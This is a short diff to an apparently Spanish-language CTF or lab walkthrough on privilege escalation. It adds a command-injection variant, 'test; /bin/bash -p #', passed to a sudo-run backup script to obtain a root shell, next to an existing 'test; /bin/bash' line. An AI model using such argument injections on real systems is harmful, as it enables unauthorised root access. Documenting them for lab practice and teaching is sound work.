@@ -138,6 +138,7 @@ Paso 3:
 ❯ sudo /opt/backup/DbMaria     # Ejecutar el script para ver que hace
 
 ❯ sudo /opt/backup/DbMaria "test; /bin/bash"  # Obtener shell con root (Puede estar limitada)
+❯ sudo /opt/backup/DbMaria 'test; /bin/bash -p #'
 # Se puede agregar o no el nombre oficial de la DB  
 ```
 
